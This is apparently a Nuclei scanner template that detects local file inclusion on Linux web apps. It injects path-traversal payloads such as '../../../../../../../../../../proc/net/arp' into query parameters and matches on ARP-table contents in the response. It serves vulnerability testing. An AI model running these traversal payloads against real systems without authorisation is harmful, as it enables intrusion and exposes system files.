http:
- fuzzing:
  - fuzz:
    - '{{nix_fuzz}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - address
    - type
    - Mask
    - Device
  - negative: true
    part: header
    type: word
    words:
    - application/javascript
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    nix_fuzz:
    - /proc/net/arp
    - ///////proc/net/arp
    - ../../../../../../../../../../proc/net/arp
    - /../../../../../../../../../../proc/net/arp
  stop-at-first-match: true
id: linux-lfi-fuzz-arp-table
info:
  author: reewardius
  name: Local File Inclusion via ARP Table - Linux
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
  severity: high
  tags: fuzzing-lfi,fuzzing-req,dast
